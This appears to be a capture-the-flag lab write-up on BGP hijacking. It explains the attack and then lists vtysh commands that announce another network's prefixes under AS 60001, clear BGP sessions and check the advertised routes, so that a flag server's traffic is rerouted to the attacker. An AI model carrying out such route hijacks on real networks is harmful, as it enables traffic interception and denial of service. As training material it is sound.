# MITM Exploits
BGP Hijacking
-------------

**Info:** BGP, or Border Gateway Protocol, is used to direct traffic across the Internet. Networks use BGP to exchange “reachability information” – networks they know how to get to. Any network that is connected to the Internet eventually relies on BGP to reach other networks. 

**How it works:** BGP hijacking is when an attacker disguises itself as another network; it announces network prefixes belonging to another network as if those prefixes are theirs. If this false information is accepted by neighboring networks and propagated further using BGP, it distorts the “roadmap” of the Internet. As a result, traffic is forwarded to the attacker instead of its legitimate destination, causing Denial of Service (DoS) attacks or traffic interception.

![BGP Hijacking Flow](MITM%20Exploits/bgp-hijacking-technical-flow.p)

Our main objective is to hijack the sever with flag and re-route the flag packet to us.

### Exploitation

we are going to launch the BGP config shell with the following command and enter the BGP configuration mode with the following command.

```text-plain
vtysh
config terminal
```

We need to add a route to make sure the flag server route the packet to us.

```text-plain
router bgp 60001
network 172.16.2.0/25
network 172.16.3.0/25
end
```

and then in vtysh terminal,

```text-plain
clear ip bgp *
```

check the updated routes, in vtysh term,

```text-plain
show ip bgp neighbors 172.16.12.102 advertised-routes
```
